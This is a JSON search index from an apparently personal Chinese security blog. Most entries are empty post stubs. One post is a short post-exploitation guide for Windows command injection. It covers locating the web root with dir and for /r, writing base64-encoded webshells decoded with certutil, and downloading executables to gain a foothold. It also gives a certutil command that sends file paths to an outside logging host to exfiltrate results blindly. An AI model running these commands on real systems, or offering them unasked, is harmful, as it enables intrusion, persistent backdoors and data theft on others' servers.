[{"categories":["struct2"],"content":"","date":"2024-01-05","objectID":"https://J1oo.github.io/2024/01/s2-066/","series":null,"tags":["rce"],"title":"S2 066","uri":"https://J1oo.github.io/2024/01/s2-066/"},{"categories":["web"],"content":"\u003ch1 id=\"判断目标操作系统\" class=\"headerLink\"\u003e\n    \u003ca href=\"#%e5%88%a4%e6%96%ad%e7%9b%ae%e6%a0%87%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f\" class=\"header-mark\"\u003e\u003c/a\u003e判断目标操作系统\u003c/h1\u003e\u003cp\u003ewindows和linux系统下的ping命令参数不同，windows用-n，linux用-c\u003c/p\u003e\n\u003cp\u003e所以可以在burp当中用\u003ccode\u003eping -n 3\u003c/code\u003e来判断\u003c/p\u003e\n\u003cp\u003e如果是windows系统则会产生相应延时，反之则是linux系统\u003c/p\u003e\n\u003ch1 id=\"windows下的命令执行\" class=\"headerLink\"\u003e\n    \u003ca href=\"#windows%e4%b8%8b%e7%9a%84%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c\" class=\"header-mark\"\u003e\u003c/a\u003ewindows下的命令执行\u003c/h1\u003e\u003ch2 id=\"有回显并且出网\" class=\"headerLink\"\u003e\n    \u003ca href=\"#%e6%9c%89%e5%9b%9e%e6%98%be%e5%b9%b6%e4%b8%94%e5%87%ba%e7%bd%91\" class=\"header-mark\"\u003e\u003c/a\u003e1 有回显并且出网\u003c/h2\u003e\u003ch3 id=\"1显示路径\" class=\"headerLink\"\u003e\n    \u003ca href=\"#1%e6%98%be%e7%a4%ba%e8%b7%af%e5%be%84\" class=\"header-mark\"\u003e\u003c/a\u003e1.1 1.显示路径\u003c/h3\u003e\u003cp\u003e可以选择一些特殊文件比如\u003ccode\u003ems-el-form.umd.js\u003c/code\u003e，然后搭配下面的指令来显示路径\u003c/p\u003e\n\u003cp\u003e\u003ca class=\"lightgallery\" href=\"../../../../img/image-20240104202100801.png\" title=\"image-20240104202100801\" data-thumbnail=\"../../../../img/image-20240104202100801.png\"\u003e\n        \u003cimg\n            \n            loading=\"lazy\"\n            src=\"../../../../img/image-20240104202100801.png\"\n            srcset=\"../../../../img/image-20240104202100801.png, ../../../../img/image-20240104202100801.png 1.5x, ../../../../img/image-20240104202100801.png 2x\"\n            sizes=\"auto\"\n            alt=\"../../../../img/image-20240104202100801.png\"\u003e\n    \u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edir /s /a-d /b ms-el-form.umd.js\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003e\u003ca class=\"lightgallery\" href=\"../../../../img/image-20240104203743837.png\" title=\"image-20240104203743837\" data-thumbnail=\"../../../../img/image-20240104203743837.png\"\u003e\n        \u003cimg\n            \n            loading=\"lazy\"\n            src=\"../../../../img/image-20240104203743837.png\"\n            srcset=\"../../../../img/image-20240104203743837.png, ../../../../img/image-20240104203743837.png 1.5x, ../../../../img/image-20240104203743837.png 2x\"\n            sizes=\"auto\"\n            alt=\"../../../../img/image-20240104203743837.png\"\u003e\n    \u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e知道了路径就可以往网站目录写webshell了，写的时候需要注意转义\u003c/p\u003e\n\u003ch3 id=\"2远程下载\" class=\"headerLink\"\u003e\n    \u003ca href=\"#2%e8%bf%9c%e7%a8%8b%e4%b8%8b%e8%bd%bd\" class=\"header-mark\"\u003e\u003c/a\u003e1.2 2.远程下载\u003c/h3\u003e\u003cp\u003e调用远程下载的命令来把webshell下载到网站目录、下载exe上线\u003c/p\u003e\n\u003ch2 id=\"有回显不出网\" class=\"headerLink\"\u003e\n    \u003ca href=\"#%e6%9c%89%e5%9b%9e%e6%98%be%e4%b8%8d%e5%87%ba%e7%bd%91\" class=\"header-mark\"\u003e\u003c/a\u003e2 有回显不出网\u003c/h2\u003e\u003ch3 id=\"1显示路径-1\" class=\"headerLink\"\u003e\n    \u003ca href=\"#1%e6%98%be%e7%a4%ba%e8%b7%af%e5%be%84-1\" class=\"header-mark\"\u003e\u003c/a\u003e2.1 1.显示路径\u003c/h3\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\"\u003e1\n\u003c/span\u003e\u003cspan class=\"lnt\"\u003e2\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edir /s /a-d /b ms-el-form.umd.js\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efor /r c: %i in (ms-el-form.umd.js*) do @echo %i\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eecho写入base64编码的webshell，然后用certutil解码\u003c/p\u003e\n\u003ch2 id=\"无回显出网\" class=\"headerLink\"\u003e\n    \u003ca href=\"#%e6%97%a0%e5%9b%9e%e6%98%be%e5%87%ba%e7%bd%91\" class=\"header-mark\"\u003e\u003c/a\u003e3 无回显出网\u003c/h2\u003e\u003cp\u003e写入webshell或者远程下载exe\u003c/p\u003e\n\u003cp\u003e找个特殊的文件，可以盲打，将结果输出到新建文件然后读取\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efor /r C:\\  %i  in  (20230726070752*.jsp) do @echo caonimalzf\u0026#39; \u0026gt; %i.jsp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003e知道了路径就可以\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003efor /r c: %i in (ms-el-form.umd*.js) do certutil -urlcache -split -f http:690516bc1c.ipv6.1433.eu.org.%i\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003e690516bc1c.ipv6.1433.eu.org.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==\u0026amp;mid=2247483888\u0026amp;idx=1\u0026amp;sn=1b27699118e73565fa62aa73ab8fcbd8\u0026amp;chksm=c2a1d579f5d65c6ff6292013a5f272ccd27b940ef8efc790055259b97a85fb6b8992c9bcf435\u0026amp;mpshare=1\u0026amp;scene=1\u0026amp;srcid=0208XTmwC6NG4aBm5epId8as\u0026amp;sharer_sharetime=1644311126317\u0026amp;sharer_shareid=364b318b59e17770cdf42d79a4539355\u0026amp;version=4.0.0.6007\u0026amp;platform=win#rd\" target=\"_blank\" rel=\"noopener noreferrer\"\u003ehttps://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==\u0026mid=2247483888\u0026idx=1\u0026sn=1b27699118e73565fa62aa73ab8fcbd8\u0026chksm=c2a1d579f5d65c6ff6292013a5f272ccd27b940ef8efc790055259b97a85fb6b8992c9bcf435\u0026mpshare=1\u0026scene=1\u0026srcid=0208XTmwC6NG4aBm5epId8as\u0026sharer_sharetime=1644311126317\u0026sharer_shareid=364b318b59e17770cdf42d79a4539355\u0026version=4.0.0.6007\u0026platform=win#rd\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://cn-sec.com/archives/1129108.html\" target=\"_blank\" rel=\"noopener noreferrer\"\u003ehttps://cn-sec.com/archives/1129108.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://lmcmc.github.io/2020/11/28/RCE%E4%B9%8B%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE/\" target=\"_blank\" rel=\"noopener noreferrer\"\u003ehttps://lmcmc.github.io/2020/11/28/RCE%E4%B9%8B%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE/\u003c/a\u003e\u003c/p\u003e\n","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/"},{"categories":["web"],"content":" 判断目标操作系统windows和linux系统下的ping命令参数不同，windows用-n，linux用-c 所以可以在burp当中用ping -n 3来判断 如果是windows系统则会产生相应延时，反之则是linux系统 ","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:0:0","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#判断目标操作系统"},{"categories":["web"],"content":" windows下的命令执行","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:0:0","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#windows下的命令执行"},{"categories":["web"],"content":" 1 有回显并且出网","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:1:0","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#有回显并且出网"},{"categories":["web"],"content":" 1.1 1.显示路径可以选择一些特殊文件比如ms-el-form.umd.js，然后搭配下面的指令来显示路径 dir /s /a-d /b ms-el-form.umd.js 知道了路径就可以往网站目录写webshell了，写的时候需要注意转义 ","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:1:1","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#1显示路径"},{"categories":["web"],"content":" 1.2 2.远程下载调用远程下载的命令来把webshell下载到网站目录、下载exe上线 ","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:1:2","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#2远程下载"},{"categories":["web"],"content":" 2 有回显不出网","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:2:0","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#有回显不出网"},{"categories":["web"],"content":" 2.1 1.显示路径 dir /s /a-d /b ms-el-form.umd.js for /r c: %i in (ms-el-form.umd.js*) do @echo %i echo写入base64编码的webshell，然后用certutil解码 ","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:2:1","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#1显示路径-1"},{"categories":["web"],"content":" 3 无回显出网写入webshell或者远程下载exe 找个特殊的文件，可以盲打，将结果输出到新建文件然后读取 for /r C:\\ %i in (20230726070752*.jsp) do @echo caonimalzf' \u003e %i.jsp 知道了路径就可以 for /r c: %i in (ms-el-form.umd*.js) do certutil -urlcache -split -f http:690516bc1c.ipv6.1433.eu.org.%i 690516bc1c.ipv6.1433.eu.org. https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==\u0026mid=2247483888\u0026idx=1\u0026sn=1b27699118e73565fa62aa73ab8fcbd8\u0026chksm=c2a1d579f5d65c6ff6292013a5f272ccd27b940ef8efc790055259b97a85fb6b8992c9bcf435\u0026mpshare=1\u0026scene=1\u0026srcid=0208XTmwC6NG4aBm5epId8as\u0026sharer_sharetime=1644311126317\u0026sharer_shareid=364b318b59e17770cdf42d79a4539355\u0026version=4.0.0.6007\u0026platform=win#rd https://cn-sec.com/archives/1129108.html https://lmcmc.github.io/2020/11/28/RCE%E4%B9%8B%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE/ ","date":"2024-01-04","objectID":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/:3:0","series":null,"tags":["回显"],"title":"命令执行回显探究","uri":"https://J1oo.github.io/2024/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%9B%9E%E6%98%BE%E6%8E%A2%E7%A9%B6/#无回显出网"},{"categories":null,"content":"","date":"2024-01-03","objectID":"https://J1oo.github.io/2024/01/nacos-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","series":null,"tags":null,"title":"Nacos Hessian 反序列化","uri":"https://J1oo.github.io/2024/01/nacos-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"categories":null,"content":"","date":"2024-01-03","objectID":"https://J1oo.github.io/2024/01/ofbiz/","series":null,"tags":null,"title":"OFbiz","uri":"https://J1oo.github.io/2024/01/ofbiz/"},{"categories":["web"],"content":"","date":"2024-01-03","objectID":"https://J1oo.github.io/2024/01/sql/","series":null,"tags":["web"],"title":"Sql","uri":"https://J1oo.github.io/2024/01/sql/"}]